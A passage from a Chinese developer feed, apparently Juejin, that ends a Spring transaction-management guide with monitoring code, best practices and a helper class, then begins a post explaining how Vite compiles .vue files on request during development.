        <span class="hljs-comment">// 非事务：复杂计算</span>
        <span class="hljs-type">OrderCalculation</span> <span class="hljs-variable">calculation</span> <span class="hljs-operator">=</span> complexCalculationService.calculate(order);
        
        <span class="hljs-comment">// 事务2：更新订单</span>
        updateOrder(calculation);
        
        <span class="hljs-comment">// 非事务：文件生成</span>
        fileService.generateOrderFile(order);
    }
    
    <span class="hljs-meta">@Transactional(propagation = Propagation.REQUIRES_NEW)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">saveOrder</span><span class="hljs-params">(Order order)</span> {
        orderDao.save(order);
    }
    
    <span class="hljs-meta">@Transactional(propagation = Propagation.REQUIRES_NEW)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateOrder</span><span class="hljs-params">(OrderCalculation calculation)</span> {
        orderDao.update(calculation);
    }
}
</code></pre>
<h3 data-id="heading-30">6.1.2 只读事务优化</h3>
<p><strong>只读事务配置</strong>：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">QueryService</span> {
    
    <span class="hljs-comment">// ✅ 明确指定为只读事务，性能更好</span>
    <span class="hljs-meta">@Transactional</span>(readOnly = <span class="hljs-literal">true</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Order</span> <span class="hljs-title function_">getOrderById</span>(<span class="hljs-params">Long orderId</span>) {
        <span class="hljs-keyword">return</span> orderDao.<span class="hljs-title function_">findById</span>(orderId);
    }
    
    <span class="hljs-meta">@Transactional</span>(readOnly = <span class="hljs-literal">true</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">Order</span>&gt; <span class="hljs-title function_">getOrdersByStatus</span>(<span class="hljs-params">OrderStatus status</span>) {
        <span class="hljs-keyword">return</span> orderDao.<span class="hljs-title function_">findByStatus</span>(status);
    }
    
    <span class="hljs-comment">// ✅ 复杂查询使用只读事务</span>
    <span class="hljs-meta">@Transactional</span>(readOnly = <span class="hljs-literal">true</span>, timeout = <span class="hljs-number">30</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">OrderReport</span> <span class="hljs-title function_">generateOrderReport</span>(<span class="hljs-params"><span class="hljs-built_in">Date</span> startDate, <span class="hljs-built_in">Date</span> endDate</span>) {
        <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">Order</span>&gt; orders = orderDao.<span class="hljs-title function_">findByDateRange</span>(startDate, endDate);
        <span class="hljs-keyword">return</span> orderReportService.<span class="hljs-title function_">generate</span>(orders);
    }
}
</code></pre>
<p><strong>只读事务性能优势</strong>：</p>






























<table><thead><tr><th>特性</th><th>普通事务</th><th>只读事务</th></tr></thead><tbody><tr><td>数据库连接</td><td>写连接</td><td>读连接</td></tr><tr><td>锁机制</td><td>排他锁</td><td>共享锁</td></tr><tr><td>性能开销</td><td>较高</td><td>较低</td></tr><tr><td>适用场景</td><td>增删改操作</td><td>查询操作</td></tr></tbody></table>
<h3 data-id="heading-31">6.2 事务监控与诊断</h3>
<h3 data-id="heading-32">6.2.1 事务监控指标</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransactionMonitor</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LoggerFactory.getLogger(TransactionMonitor.class);
    
    <span class="hljs-meta">@EventListener</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleTransactionEvent</span><span class="hljs-params">(TransactionApplicationEvent event)</span> {
        <span class="hljs-keyword">if</span> (event <span class="hljs-keyword">instanceof</span> TransactionAfterCompletionEvent) {
            <span class="hljs-type">TransactionAfterCompletionEvent</span> <span class="hljs-variable">completionEvent</span> <span class="hljs-operator">=</span> (TransactionAfterCompletionEvent) event;
            <span class="hljs-type">int</span> <span class="hljs-variable">status</span> <span class="hljs-operator">=</span> completionEvent.getTransactionStatus().getCompletionStatus();
            
            <span class="hljs-keyword">switch</span> (status) {
                <span class="hljs-keyword">case</span> TransactionStatus.STATUS_COMMITTED:
                    logger.info(<span class="hljs-string">"事务提交成功: {}"</span>, completionEvent.getTransactionContext());
                    <span class="hljs-keyword">break</span>;
                <span class="hljs-keyword">case</span> TransactionStatus.STATUS_ROLLED_BACK:
                    logger.warn(<span class="hljs-string">"事务回滚: {}"</span>, completionEvent.getTransactionContext());
                    <span class="hljs-keyword">break</span>;
                <span class="hljs-keyword">default</span>:
                    logger.info(<span class="hljs-string">"事务状态: {}"</span>, status);
            }
        }
    }
}
</code></pre>
<h3 data-id="heading-33">6.2.2 慢事务检测</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Aspect</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SlowTransactionAspect</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">SLOW_TRANSACTION_THRESHOLD</span> <span class="hljs-operator">=</span> <span class="hljs-number">1000</span>; <span class="hljs-comment">// 1秒</span>
    
    <span class="hljs-meta">@Around("@annotation(org.springframework.transaction.annotation.Transactional)")</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">monitorTransactionPerformance</span><span class="hljs-params">(ProceedingJoinPoint joinPoint)</span> <span class="hljs-keyword">throws</span> Throwable {
        <span class="hljs-type">long</span> <span class="hljs-variable">startTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis();
        Object result;
        
        <span class="hljs-keyword">try</span> {
            result = joinPoint.proceed();
            <span class="hljs-keyword">return</span> result;
            
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-type">long</span> <span class="hljs-variable">duration</span> <span class="hljs-operator">=</span> System.currentTimeMillis() - startTime;
            <span class="hljs-keyword">if</span> (duration &gt; SLOW_TRANSACTION_THRESHOLD) {
                <span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> joinPoint.getSignature().getName();
                logger.warn(<span class="hljs-string">"慢事务警告: 方法 {} 执行时间 {}ms"</span>, methodName, duration);
            }
        }
    }
}
</code></pre>
<h3 data-id="heading-34">6.3 事务管理最佳实践清单</h3>
<p><strong>开发规范</strong>：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f8f8ca45194b4885ae7465098bfd3091~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56We5aWH5bCP5rGk5ZyG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768289161&amp;x-signature=vc12dxT4JRhVfat8kwmSa0ix9G4%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-35">🎯 七、总结与建议</h2>
<h3 data-id="heading-36">7.1 核心要点回顾</h3>
<ol>
<li><strong>事务传播机制</strong>：正确理解7种传播行为的区别，合理选择传播方式</li>
<li><strong>嵌套事务</strong>：掌握保存点机制，适合逻辑嵌套回滚场景</li>
<li><strong>失效场景</strong>：避免方法访问修饰、同类调用、异常处理等常见陷阱</li>
<li><strong>分布式事务</strong>：根据业务场景选择合适的分布式事务解决方案</li>
<li><strong>性能优化</strong>：控制事务粒度，使用只读事务，避免长事务<br/>
7.2 不同场景的事务选择指南<br/>
<strong>场景对照表</strong>：</li>
</ol>





























































<table><thead><tr><th>业务场景</th><th>推荐传播行为</th><th>事务类型</th><th>隔离级别</th><th>超时设置</th></tr></thead><tbody><tr><td>单表CRUD操作</td><td>REQUIRED</td><td>本地事务</td><td>READ_COMMITTED</td><td>默认</td></tr><tr><td>跨表操作</td><td>REQUIRED</td><td>本地事务</td><td>READ_COMMITTED</td><td>30秒</td></tr><tr><td>日志记录</td><td>REQUIRES_NEW</td><td>独立事务</td><td>READ_COMMITTED</td><td>10秒</td></tr><tr><td>批量导入</td><td>NESTED</td><td>嵌套事务</td><td>READ_COMMITTED</td><td>根据数据量</td></tr><tr><td>报表查询</td><td>SUPPORTS</td><td>只读事务</td><td>READ_COMMITTED</td><td>60秒</td></tr><tr><td>支付处理</td><td>REQUIRED</td><td>本地事务</td><td>SERIALIZABLE</td><td>15秒</td></tr><tr><td>跨服务调用</td><td>分布式事务</td><td>Seata/MQ</td><td>-</td><td>-</td></tr></tbody></table>
<p>7.3 实战建议<br/>
<strong>开发阶段</strong>：</p>
<ol>
<li><strong>明确事务边界</strong>：仔细分析业务逻辑，确定事务的开始和结束点</li>
<li><strong>选择合适传播</strong>：根据业务需求选择合适的事务传播行为</li>
<li><strong>异常处理规范</strong>：明确定义哪些异常需要回滚，哪些不需要</li>
<li><strong>编写测试用例</strong>：覆盖正常、异常、边界等各种场景 <strong>运维阶段</strong>：</li>
<li><strong>监控事务性能</strong>：重点关注慢事务和频繁回滚的事务</li>
<li><strong>定期检查死锁</strong>：监控数据库死锁情况，优化SQL语句</li>
<li><strong>告警机制</strong>：设置合理的事务告警阈值，及时发现问题</li>
<li><strong>容量规划</strong>：根据事务量评估数据库连接池大小 <strong>故障处理</strong>：</li>
<li><strong>快速定位问题</strong>：通过日志和监控快速定位事务问题</li>
<li><strong>数据修复</strong>：对于已发生的数据不一致，及时进行数据修复</li>
<li><strong>根因分析</strong>：深入分析事务失效的根本原因，制定改进措施</li>
<li><strong>预案制定</strong>：制定分布式事务失败的各种处理预案<br/>
🔧 附录：事务管理工具类</li>
</ol>

<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">/**
 * 事务管理工具类
 * 提供常用的事务操作方法
 */</span>
<span class="hljs-keyword">@Component</span>
public class TransactionUtils {
    
    <span class="hljs-keyword">@Autowired</span>
    private PlatformTransactionManager transactionManager;
    
    <span class="hljs-comment">/**
     * 在事务中执行操作
     */</span>
    public &lt;T&gt; T <span class="hljs-built_in">executeInTransaction</span>(TransactionCallback&lt;T&gt; action) {
        TransactionTemplate transactionTemplate = new <span class="hljs-built_in">TransactionTemplate</span>(transactionManager);
        return transactionTemplate<span class="hljs-selector-class">.execute</span>(action);
    }
    
    <span class="hljs-comment">/**
     * 在新事务中执行操作
     */</span>
    public &lt;T&gt; T <span class="hljs-built_in">executeInNewTransaction</span>(TransactionCallback&lt;T&gt; action) {
        TransactionTemplate transactionTemplate = new <span class="hljs-built_in">TransactionTemplate</span>(transactionManager);
        transactionTemplate<span class="hljs-selector-class">.setPropagationBehavior</span>(TransactionDefinition.PROPAGATION_REQUIRES_NEW);
        return transactionTemplate<span class="hljs-selector-class">.execute</span>(action);
    }
    
    <span class="hljs-comment">/**
     * 在嵌套事务中执行操作
     */</span>
    public &lt;T&gt; T <span class="hljs-built_in">executeInNestedTransaction</span>(TransactionCallback&lt;T&gt; action) {
        TransactionTemplate transactionTemplate = new <span class="hljs-built_in">TransactionTemplate</span>(transactionManager);
        transactionTemplate<span class="hljs-selector-class">.setPropagationBehavior</span>(TransactionDefinition.PROPAGATION_NESTED);
        return transactionTemplate<span class="hljs-selector-class">.execute</span>(action);
    }
    
    <span class="hljs-comment">/**
     * 只读事务执行查询
     */</span>
    public &lt;T&gt; T <span class="hljs-built_in">executeInReadOnlyTransaction</span>(TransactionCallback&lt;T&gt; action) {
        TransactionTemplate transactionTemplate = new <span class="hljs-built_in">TransactionTemplate</span>(transactionManager);
        transactionTemplate<span class="hljs-selector-class">.setReadOnly</span>(true);
        return transactionTemplate<span class="hljs-selector-class">.execute</span>(action);
    }
}
</code></pre>
<hr/>
<p><strong>免责声明</strong>：本文中的示例代码仅供学习参考，实际应用中请根据具体业务场景进行调整。事务管理是企业级开发的核心技能，建议在实际项目中深入实践和总结经验。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[一个例子搞懂vite快再哪里]]></title>    <link>https://juejin.cn/post/7592088192506363958</link>    <guid>https://juejin.cn/post/7592088192506363958</guid>    <pubDate>2026-01-06T05:58:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592088192506363958" data-draft-id="7591767753850929194" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="一个例子搞懂vite快再哪里"/> <meta itemprop="keywords" content="前端,面试"/> <meta itemprop="datePublished" content="2026-01-06T05:58:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="周星星日记"/> <meta itemprop="url" content="https://juejin.cn/user/3843548384076462"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            一个例子搞懂vite快再哪里
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3843548384076462/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    周星星日记
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T05:58:49.000Z" title="Tue Jan 06 2026 05:58:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0"><strong>第一步：浏览器请求</strong> <code>/src/main.js</code></h3>
<ul>
<li>你在浏览器中打开页面 → 浏览器加载 <code>index.html</code></li>
<li><code>index.html</code> 中有：<strong>html</strong>预览</li>
</ul>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"module"</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"/src/main.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<ul>
<li>浏览器向服务器发送请求：<code>GET /src/main.js</code></li>
</ul>
<p>💡<strong>注意</strong>：这是个 ESM 模块请求，必须用 <code>type="module"</code> 才能被浏览器支持。</p>
<hr/>
<h3 data-id="heading-1"><strong>第二步：Vite 即时编译并返回</strong> <code>main.js</code></h3>
<ul>
<li>Vite 接收到请求 <code>/src/main.js</code></li>
<li>它读取这个文件，发现它导入了 <code>vue</code> 和 <code>App.vue</code></li>
<li>由于 <code>main.js</code> 是纯 JS，无需复杂转换，Vite 直接返回：<strong>js</strong>编辑</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { createApp } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./App.vue'</span>;

<span class="hljs-title function_">createApp</span>(<span class="hljs-title class_">App</span>).<span class="hljs-title function_">mount</span>(<span class="hljs-string">'#app'</span>);
</code></pre>
<p>注意：此时还没有处理 <code>App.vue</code>，因为浏览器还没请求它！</p>
<hr/>
<h3 data-id="heading-2"><strong>第三步：</strong> <code>main.js</code> <strong>import</strong> <code>App.vue</code> <strong>→ 浏览器自动请求</strong> <code>/src/App.vue</code></h3>
<ul>
<li>浏览器执行 <code>main.js</code>，遇到：<strong>js</strong>编辑</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./App.vue'</span>;
</code></pre>
<ul>
<li>浏览器根据 ESM 规范，<strong>自动发起新的 HTTP 请求</strong>：<strong>bash</strong>编辑</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">GET /src/App.vue
</code></pre>
<p>这是关键！<strong>浏览器会自动按依赖关系加载模块</strong>，不需要 Vite 主动推送。</p>
<hr/>
<h3 data-id="heading-3"><strong>第四步：Vite 编译</strong> <code>App.vue</code> <strong>并返回 JS</strong></h3>
<ul>
<li>Vite 收到 <code>/src/App.vue</code> 的请求</li>
<li>它知道 <code>.vue</code> 文件需要解析模板、脚本、样式</li>
<li>Vite 使用内置的 <strong>Vue SFC 编译器</strong> 将 <code>App.vue</code> 转换为纯 JavaScript：<strong>js</strong>编辑</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 编译后的内容（简化版）</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">App</span> = {
  <span class="hljs-title function_">setup</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> {};
  },
  <span class="hljs-title function_">render</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">h</span>(<span class="hljs-string">'div'</span>, [<span class="hljs-title function_">h</span>(<span class="hljs-title class_">Header</span>), <span class="hljs-title function_">h</span>(<span class="hljs-title class_">Home</span>)]);
  }
};
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">App</span>;
</code></pre>
<ul>
<li>然后 Vite 返回这段 JS 给浏览器</li>
</ul>
<p>我们来详细解释：</p>
<hr/>
<h4 data-id="heading-4"><strong>1.</strong> <code>.vue</code> <strong>文件不是标准 JavaScript</strong></h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-comment">&lt;!-- App.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">Header</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">Home</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  <span class="hljs-keyword">import</span> <span class="hljs-title class_">Header</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./Header.vue'</span>
  <span class="hljs-keyword">import</span> <span class="hljs-title class_">Home</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./Home.vue'</span>
  <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
    <span class="hljs-attr">components</span>: { <span class="hljs-title class_">Header</span>, <span class="hljs-title class_">Home</span> }
  }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<ul>
<li>浏览器<strong>无法直接理解</strong>这种语法。</li>
<li>它需要被转换成浏览器能执行的 <strong>纯 JavaScript + 渲染函数</strong>。</li>
</ul>
<hr/>
<h4 data-id="heading-5"><strong>2. Vite（通过 @vitejs/plugin-vue）将</strong> <code>.vue</code> <strong>编译为 JS 模块</strong></h4>
<p>当你在浏览器中请求 <code>/src/App.vue</code> 时，Vite 内部使用 <strong>Vue 官方的 SFC 编译器（</strong> <code>@vue/compiler-sfc</code> <strong>）</strong> 将其转换为一个<strong>标准的 ES 模块（ESM）</strong> ，内容大致如下（简化版）：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 这是一个合法的 JavaScript 模块！</span>
<span class="hljs-keyword">import</span> { defineComponent <span class="hljs-keyword">as</span> _defineComponent } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Header</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./Header.vue'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Home</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./Home.vue'</span>;

<span class="hljs-keyword">const</span> <span class="hljs-title class_">App</span> = <span class="hljs-comment">/*#__PURE__*/</span><span class="hljs-title function_">_defineComponent</span>({
  <span class="hljs-attr">__name</span>: <span class="hljs-string">'App'</span>,
  <span class="hljs-title function_">setup</span>(<span class="hljs-params">__props, { expose }</span>) {
    <span class="hljs-title function_">expose</span>();
    <span class="hljs-keyword">return</span> {};
  },
  <span class="hljs-title function_">render</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> _component_Header = <span class="hljs-title class_">Header</span>;
    <span class="hljs-keyword">const</span> _component_Home = <span class="hljs-title class_">Home</span>;
    <span class="hljs-keyword">return</span> (<span class="hljs-title function_">_openBlock</span>(), <span class="hljs-title function_">_createElementBlock</span>(<span class="hljs-string">"div"</span>, <span class="hljs-literal">null</span>, [
      <span class="hljs-title function_">_createVNode</span>(_component_Header),
      <span class="hljs-title function_">_createVNode</span>(_component_Home)
    ]));
  }
});

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">App</span>;
</code></pre>
<p>🔍 注意：</p>
<ul>
<li>它有 <code>import</code> 和 <code>export</code> → 是标准 ESM</li>
<li>它导出一个对象（或函数），符合 Vue 组件规范</li>
<li>它可以被其他模块（如 <code>main.js</code>）正常导入</li>
</ul>
<hr/>
<h4 data-id="heading-6"><strong>3. 浏览器如何处理这个“JS 文件”？</strong></h4>
<p>当 Vite 返回上述代码时，对浏览器来说：</p>
<ul>
<li>它收到的是一个 <code>.js</code> <strong>类型的响应</strong>（即使 URL 是 <code>/src/App.vue</code>）</li>
<li>因为请求是通过 <code>&lt;script type="module"&gt;</code> 触发的，浏览器会：</li>
</ul>
<ol>
<li>
<ol>
<li>解析这段 JS</li>
<li>执行其中的 <code>import</code>（自动发起新请求加载 <code>Header.vue</code> 等）</li>
<li>把 <code>App</code> 组件注册到 Vue 应用中</li>
</ol>
</li>
</ol>
<p>从网络面板看：<br/>
请求 URL 是 <code>App.vue</code>，但 <strong>Content-Type 是</strong> <code>application/javascript</code>，说明服务器返回的是 JS。</p>
<hr/>
<h4 data-id="heading-7"><strong>4. 为什么说它是“一个 JS 文件”？</strong></h4>
<p>虽然物理上你写的是 <code>.vue</code> 文件，但在开发服务器运行时：</p>





















<table><thead><tr><th><strong>角色</strong></th><th><strong>看到的内容</strong></th></tr></thead><tbody><tr><td><strong>开发者</strong></td><td><code>.vue</code>单文件组件（模板 + 脚本 + 样式）</td></tr><tr><td><strong>Vite 服务器</strong></td><td>接收 <code>.vue</code>请求 → 编译 → 返回 JS</td></tr><tr><td><strong>浏览器</strong></td><td>收到一段可执行的 JavaScript 模块</td></tr></tbody></table>
<p>所以，<strong>在运行时，</strong> <code>.vue</code> <strong>文件被“虚拟地”转换成了一个 JS 模块</strong>。你可以把它理解为：</p>
<p>💡 <strong>“每个</strong> <code>.vue</code> <strong>文件在 Vite 中都会动态生成一个对应的 JS 模块”</strong></p>
<hr/>
<h4 data-id="heading-8"><strong>5. 验证方法：打开浏览器 DevTools</strong></h4>
<ol>
<li>启动 Vite 项目</li>
<li>打开 Chrome DevTools → Network（网络）选项卡</li>
<li>刷新页面</li>
<li>找到 <code>App.vue</code> 的请求</li>
<li>点击它，查看 <strong>Preview 或 Response</strong></li>
</ol>
<p>你会看到：<strong>返回的确实是 JavaScript 代码</strong>，而不是原始的 <code>&lt;template&gt;</code> 结构！</p>
<hr/>
<h4 data-id="heading-9"><strong>总结</strong></h4>
<p><strong>是的，</strong> <code>App.vue</code> ****<strong>在 Vite 开发服务器中会被编译成一个标准的 JavaScript ES 模块，并以 JS 形式返回给浏览器。</strong></p>
<p>虽然文件扩展名是 <code>.vue</code>，但<strong>传输和执行的内容是纯 JS</strong>，因此对浏览器来说，它就是一个普通的 JS 模块。</p>
<p>这就是 Vite（以及现代前端工具链）能够无缝支持 <code>.vue</code>、<code>.svelte</code>、<code>.jsx</code> 等非标准文件的关键机制：<strong>在请求时即时编译为浏览器可执行的 JavaScript</strong>。</p>
<hr/>
<h3 data-id="heading-10"><strong>第五步：</strong> <code>App.vue</code> <strong>import</strong> <code>Header.vue</code> <strong>和</strong> <code>Home.vue</code> <strong>→ 继续按需加载</strong></h3>
<ul>
